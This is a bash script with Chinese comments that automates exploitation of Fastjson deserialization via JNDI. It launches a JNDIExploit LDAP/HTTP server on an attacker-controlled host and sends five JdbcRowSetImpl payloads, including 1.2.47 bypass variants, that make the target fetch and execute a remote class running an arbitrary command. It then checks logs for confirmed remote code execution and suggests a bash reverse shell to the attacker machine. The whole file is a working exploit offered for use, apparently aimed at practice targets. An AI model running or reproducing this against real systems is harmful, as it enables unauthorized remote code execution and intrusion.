#!/bin/bash
# =============================================================
# jndi_fastjson.sh — Fastjson JNDI 一键利用脚本
#
# 用法：
#   /opt/jndi_fastjson.sh <目标URL> <LHOST> [命令] [LDAP端口] [HTTP端口]
#
# 示例：
#   /opt/jndi_fastjson.sh http://192.168.1.100:8090/ 10.0.0.5 id
#   /opt/jndi_fastjson.sh http://target:8090/ 攻击机IP whoami 1389 8888
#
# 流程（全部在一个进程内完成）：
#   1. 启动 JNDIExploit 监听 LDAP + HTTP
#   2. 发送 Fastjson 1.2.24 payload（JdbcRowSetImpl）
#   3. 发送 Fastjson 1.2.47 bypass payload
#   4. 等待回调
#   5. 输出结果
# =============================================================

set -o pipefail

TARGET_URL="${1:?用法: $0 <目标URL> <LHOST> [命令] [LDAP端口] [HTTP端口]}"
LHOST="${2:?请指定LHOST（攻击机IP，靶机必须能访问到）}"
CMD="${3:-id}"
LDAP_PORT="${4:-1389}"
HTTP_PORT="${5:-8888}"

echo "=== JNDI Fastjson Exploit ==="
echo "目标: $TARGET_URL"
echo "LHOST: $LHOST"
echo "命令: $CMD"
echo "LDAP: $LHOST:$LDAP_PORT"
echo "HTTP: $LHOST:$HTTP_PORT"
echo ""

# ── 检查工具 ──────────────────────────────
JNDI_JAR=""
for p in /opt/jndi/JNDIExploit*.jar /opt/jndi/jndiexploit*.jar \
         /opt/JNDIExploit*.jar /opt/JNDIExploit/JNDIExploit*.jar \
         /opt/jndi/*.jar; do
    if [ -f "$p" ]; then
        JNDI_JAR="$p"
        break
    fi
done

if [ -z "$JNDI_JAR" ]; then
    echo "ERROR: JNDIExploit.jar 未找到"
    echo "搜索过的路径:"
    ls -la /opt/jndi/ 2>/dev/null || echo "  /opt/jndi/ 不存在"
    ls -la /opt/JNDIExploit* 2>/dev/null || echo "  /opt/JNDIExploit* 不存在"
    exit 1
fi

echo "使用: $JNDI_JAR"

# ── 启动 JNDIExploit（后台）──────────────
JNDI_LOG="/tmp/jndi_$$.log"

# JDK 9+ 模块系统限制了 JNDIExploit 访问内部类，需要显式导出
java \
    --add-opens java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
    --add-opens java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
    -jar "$JNDI_JAR" \
    -i "$LHOST" \
    -l "$LDAP_PORT" \
    -p "$HTTP_PORT" \
    > "$JNDI_LOG" 2>&1 &
JNDI_PID=$!

# 等待监听就绪
sleep 3

if ! kill -0 $JNDI_PID 2>/dev/null; then
    echo "ERROR: JNDIExploit 启动失败"
    cat "$JNDI_LOG"
    exit 1
fi
echo "JNDIExploit 已启动 (PID=$JNDI_PID)"
echo ""

# ── 发送 Payload ─────────────────────────
# 命令 Base64 编码（含空格的命令必须编码）
CMD_B64=$(echo -n "$CMD" | base64 -w 0)

# Payload 格式说明：
# 很多 Fastjson 靶场用 JSON.parseObject(json, User.class)，
# @type 放顶层会报 "type not match"。
# 必须嵌套在属性字段（如 name）里才能触发 JNDI lookup。
# 每种 payload 同时尝试顶层和嵌套两种方式。

CALLBACK_FOUND=false

echo "--- Payload 1: 嵌套属性 + LDAP (最常见的成功方式) ---"
RESP=$(curl -s -X POST "$TARGET_URL" \
    -H "Content-Type: application/json" \
    -d "{\"name\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://$LHOST:$LDAP_PORT/Basic/Command/Base64/$CMD_B64\",\"autoCommit\":true},\"age\":20}" \
    --max-time 10 2>&1)
echo "响应: ${RESP:0:500}"
sleep 2
grep -qi "Received LDAP\|New HTTP Request" "$JNDI_LOG" 2>/dev/null && CALLBACK_FOUND=true
echo ""

if [ "$CALLBACK_FOUND" = false ]; then
    echo "--- Payload 2: 嵌套属性 + RMI ---"
    RESP=$(curl -s -X POST "$TARGET_URL" \
        -H "Content-Type: application/json" \
        -d "{\"name\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://$LHOST:$LDAP_PORT/Basic/Command/Base64/$CMD_B64\",\"autoCommit\":true},\"age\":20}" \
        --max-time 10 2>&1)
    echo "响应: ${RESP:0:500}"
    sleep 2
    grep -qi "Received LDAP\|Received RMI\|New HTTP Request" "$JNDI_LOG" 2>/dev/null && CALLBACK_FOUND=true
    echo ""
fi

if [ "$CALLBACK_FOUND" = false ]; then
    echo "--- Payload 3: 顶层 @type + LDAP (部分靶场用 JSON.parse) ---"
    RESP=$(curl -s -X POST "$TARGET_URL" \
        -H "Content-Type: application/json" \
        -d "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://$LHOST:$LDAP_PORT/Basic/Command/Base64/$CMD_B64\",\"autoCommit\":true}" \
        --max-time 10 2>&1)
    echo "响应: ${RESP:0:500}"
    sleep 2
    grep -qi "Received LDAP\|New HTTP Request" "$JNDI_LOG" 2>/dev/null && CALLBACK_FOUND=true
    echo ""
fi

if [ "$CALLBACK_FOUND" = false ]; then
    echo "--- Payload 4: 1.2.47 bypass + 嵌套属性 ---"
    RESP=$(curl -s -X POST "$TARGET_URL" \
        -H "Content-Type: application/json" \
        -d "{\"name\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"x\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://$LHOST:$LDAP_PORT/Basic/Command/Base64/$CMD_B64\",\"autoCommit\":true},\"age\":20}" \
        --max-time 10 2>&1)
    echo "响应: ${RESP:0:500}"
    sleep 2
    grep -qi "Received LDAP\|New HTTP Request" "$JNDI_LOG" 2>/dev/null && CALLBACK_FOUND=true
    echo ""
fi

if [ "$CALLBACK_FOUND" = false ]; then
    echo "--- Payload 5: 1.2.47 bypass + 顶层 ---"
    RESP=$(curl -s -X POST "$TARGET_URL" \
        -H "Content-Type: application/json" \
        -d "{\"a\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://$LHOST:$LDAP_PORT/Basic/Command/Base64/$CMD_B64\",\"autoCommit\":true}}" \
        --max-time 10 2>&1)
    echo "响应: ${RESP:0:500}"
    sleep 2
    grep -qi "Received LDAP\|New HTTP Request" "$JNDI_LOG" 2>/dev/null && CALLBACK_FOUND=true
    echo ""
fi

# ── 等待回调并检查结果 ──────────────────
echo "--- 等待回调 (5秒) ---"
sleep 5

echo ""
echo "=== JNDIExploit 日志 ==="
cat "$JNDI_LOG"
echo ""

# 分析结果（基于 JNDIExploit 实际输出格式）
if grep -qi "Received LDAP Query\|Received RMI Query" "$JNDI_LOG" 2>/dev/null; then
    echo ""
    echo "JNDI_CALLBACK_RECEIVED"
    echo "目标已回连 JNDI 服务！"

    # JNDIExploit 成功标志：恶意 class 被下载（HTTP 200）且无异常
    if grep -qi "Response Code: 200\|New HTTP Request.*class" "$JNDI_LOG" 2>/dev/null; then
        # 检查是否有类加载异常（JDK 模块限制）
        if grep -qi "IllegalAccessError\|ClassNotFoundException\|NoClassDefFoundError" "$JNDI_LOG" 2>/dev/null; then
            echo "JNDI_CALLBACK_ONLY"
            echo "恶意类被下载但加载时报错（JDK 模块限制），命令可能未执行。"
            echo "尝试使用 --add-opens 参数或更换 JDK 版本。"
        else
            echo "JNDI_RCE_SUCCESS"
            echo "恶意类已被目标下载并执行！命令 '$CMD' 已在目标上运行。"
            echo ""
            echo "验证方式（盲执行，无直接回显）:"
            echo "  - 如果命令是 touch/写文件: 到靶机上检查文件是否存在"
            echo "  - 如果命令是 id/whoami: 用写文件方式获取结果"
            echo "  - 反弹 shell: 用 bash -i 反弹到攻击机"
        fi
    else
        echo "JNDI_CALLBACK_ONLY"
        echo "收到回调但无法确认RCE（可能需要不同的payload类型）"
    fi
else
    echo "JNDI_NO_CALLBACK"
    echo "未收到回调。可能原因："
    echo "  1. LHOST ($LHOST) 不可被目标 ($TARGET_URL) 访问"
    echo "  2. 防火墙阻止了目标到 $LHOST:$LDAP_PORT 的连接"
    echo "  3. 目标不是 Fastjson 或版本不受影响"
    echo "  4. 目标 JDK 版本限制了远程类加载"
fi

# ── 清理 ─────────────────────────────────
kill $JNDI_PID 2>/dev/null
wait $JNDI_PID 2>/dev/null
rm -f "$JNDI_LOG"

echo ""
echo "=== 完成 ==="